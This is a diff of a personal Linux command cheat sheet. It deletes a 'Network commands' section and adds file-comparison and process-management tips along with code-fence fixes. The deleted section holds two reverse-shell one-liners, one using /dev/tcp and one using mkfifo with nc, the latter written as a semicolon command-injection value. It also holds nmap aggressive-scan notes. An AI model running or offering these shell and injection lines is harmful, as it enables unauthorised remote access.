@@ -1,46 +1,3 @@
-# Network commands
-* nmap -A: Aggressive mode
-```bash
-nmap -A IP
-```
-
-* Interactive bash shell
-```bash
-/bin/bash -i > /dev/tcp/IP/PORT 0<&1 2>&1
-```
-
-* Another way to get reverse shell with command execution
-```bash
-192.168.0.18; rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1  | nc -lp 9999 > /tmp/f
-```
-
-* Scanning all services given a server with `nmap`
-```bash
-nmap -A 192.168.0.1
-```
-
-* Show possible mount point given a server that is running NFS
-```bash
-showmount -e 192.168.0.1
-```
-
-* Show IP table rules
-```bash
-sudo iptables-save
-```
-
-* Disable a network interface card
-```bash
-sudo ifconfig eth0 down
-```
-
-* Enable a network interface card
-```bash
-sudo ifconfig eth0 up
-```
-
-* `ss`, socket statistic, `-a` shows all listening and non-listening sockets, `-n` displays the numeric IP, and does not resolve service name, `-t` specifies TCP sockets, `-l` displays only listening sockets, `-p` shows the process that is using the socket
-
 # File Manipulation
 * Shuffles the lines of a file `-R`: random
 ```bash
@@ -53,13 +10,23 @@ shuf FILE -o FILE
 ```
 
 * Print a file in reverse with `tac`
-```
+    ```bash
 cat file | tac
 ```
 
 * Print the hexdump of a file in reverse
-```
+```bash
 xxd -p -c1 file | tac | xxd -r > file.out
+```
+
+* Find the common and unique lines in two files with `comm`
+```bash
+comm file1 file2
+```
+
+* `diff -u` shows the comparison result of two files in a unified way, `-` shows the line unique to file1, `+` shows the line unique to file2
+```bash
+diff -u file1 file2
 ```
 
 * Convert Chinese unreadable filename to correct filename (AWESOME)
@@ -74,7 +41,7 @@ sudo apt install fonts-wqy-zenhei
 ```
 
 * Install Chinese pinyin input
-```
+```bash
 sudo apt-get install ibus-pinyin
 ibus restart
 ```
@@ -154,15 +121,20 @@ tar -cxzf file.tar.gz . &
 ```bash
 jobs
 ```
-```
+```bash
 ps
+```
+
+* Resume a paused running process with `fg %[number]` , e.g., `fg %2` resumes the second paused job
+```bash
+fg %2
 ```
 
 * Retrieve the first word from stdout using `awk` and `cut`
 ```bash
 echo "hello world" | awk '{print $1;}'
 ```
-```
+```bash
 echo "hello world" | cut -f 1 -d " "
 ```
 
@@ -188,12 +160,17 @@ cat data.txt | xclip -selection c
 ps -eaf
 ```
 
+* `-C` find the process id using the command name
+```bash
+ps -fC vim
+```
+
 * kill a process with `ps`
 ```bash
 ps -eaf | grep vim
 kill 1337
 ```
-```
+```bash
 kill $(ps | grep play | awk '{print $1;}')
 ```
 
